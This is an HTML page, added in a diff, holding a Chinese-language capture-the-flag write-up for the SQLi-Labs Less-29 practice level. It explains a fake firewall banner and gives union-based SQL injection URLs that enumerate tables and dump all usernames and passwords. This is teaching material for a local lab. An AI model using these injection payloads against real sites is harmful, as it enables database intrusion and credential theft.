@@ -1,0 +1,67 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>【SQLi-Labs】Less-29 虚假防御与联合查询 Writeup</title>
+    <style>
+        body { font-family: sans-serif; line-height: 1.8; max-width: 800px; margin: 0 auto; padding: 20px; color: #333; background-color: #fcfcfc; }
+        h1 { border-bottom: 2px solid #0366d6; padding-bottom: .3em; color: #0366d6; }
+        h2 { border-bottom: 1px solid #eaecef; padding-bottom: .3em; margin-top: 30px; color: #24292e; }
+        code { background-color: #f6f8fa; padding: 0.2em 0.4em; border-radius: 6px; font-family: monospace; color: #d73a49; }
+        pre { background-color: #f6f8fa; padding: 16px; border-radius: 6px; overflow: auto; font-family: monospace; }
+        .meta { color: #586069; font-size: 0.95em; margin-bottom: 20px; border-bottom: 1px dashed #eaecef; padding-bottom: 10px; }
+        .footer { margin-top: 50px; font-size: 0.9em; color: #586069; border-top: 1px solid #eaecef; padding-top: 10px; text-align: center; }
+        ul, ol { padding-left: 20px; }
+    </style>
+</head>
+<body>
+    <p><a href="index.html">← 返回首页</a></p>
+    <h1>【SQLi-Labs】Less-29 虚假防御与联合查询 Writeup</h1>
+    
+    <div class="meta">
+        <p><strong>操作者：</strong>何芊宏 | <strong>操作日期：</strong>2026.10.27 | <strong>分类：</strong>CTF | <strong>标签：</strong>SQLi-Labs, Web, SQL注入, 联合查询</p>
+    </div>
+    
+    <h2>1. 题目信息</h2>
+    <ul>
+        <li><strong>平台：</strong>SQLi-Labs (本地 phpStudy 环境)</li>
+        <li><strong>分类：</strong>Web - SQL注入</li>
+        <li><strong>题目名称：</strong>Less-29 (GET - Protection with WAF)</li>
+        <li><strong>提示：</strong>页面提示受防火墙保护，实际无过滤，单引号闭合。</li>
+    </ul>
+
+    <h2>2. 核心原理：社会工程学与虚假防御</h2>
+    <p>本关卡是一个经典的“障眼法”。页面不仅展示了巨大的 "This Site Protected by World's Best Firewall" 字样，底部的 Hint 还会回显你输入的 <code>QUERY_STRING</code>。</p>
+    <p>根据源码审计，后台仅仅是将输入的字符串原样打印，并在执行 SQL 查询时没有任何正则替换或 WAF 拦截逻辑。这种设计旨在测试渗透测试人员的心理素质：不要被表面恐吓性的文本吓倒，必须通过实际测试来验证防御机制是否真实存在。</p>
+
+    <h2>3. 操作步骤与解析</h2>
+    
+    <p><strong>第一步：探测回显点</strong></p>
+    <p><strong>输入 URL：</strong><code>?id=-1' union select 1,2,3 --+</code></p>
+    <p><strong>回显现象：</strong>页面正常显示数字 <code>2</code> 和 <code>3</code>，确认存在联合查询回显点。</p>
+
+    <p><strong>第二步：爆库名与表名</strong></p>
+    <p><strong>输入 URL：</strong><code>?id=-1' union select 1,database(),group_concat(table_name) from information_schema.tables where table_schema=database() --+</code></p>
+    <p><strong>回显现象：</strong>页面回显 <code>security</code> 以及表名 <code>emails,referrers,uagents,users</code>。</p>
+
+    <p><strong>第三步：直接脱库提取账号密码</strong></p>
+    <p><strong>输入 URL：</strong><code>?id=-1' union select 1,group_concat(username),group_concat(password) from users --+</code></p>
+    <p><strong>回显现象：</strong>页面直接爆出所有用户名和密码，包括 <code>admin:p@ssw0rd</code>，以及之前关卡遗留的测试账号。</p>
+
+    <h2>4. 踩坑记录与复盘</h2>
+    <ul>
+        <li><strong>不要被前端页面欺骗</strong>：在实战中，带有“已拦截”、“安全防护”等字样的页面，有时是应用自身伪造的静态页面。必须通过构造 `1=1` 和 `1=2` 的对比测试来确认拦截规则是否生效。</li>
+        <li><strong>Hint 的误导</strong>：底部的 `The Query String you input is:` 只是单纯回显了用户输入，并不代表它经过了严格的安全过滤。</li>
+    </ul>
+
+    <h2>5. 知识点总结</h2>
+    <ul>
+        <li><strong>黑盒测试思维</strong>：通过实际发包（如 `UNION SELECT`）来判断系统是否有防御，而非依赖视觉层面的文字提示。</li>
+    </ul>
+
+    <div class="footer">
+        <p>Hosted on GitHub Pages</p>
+    </div>
+</body>
+</html>
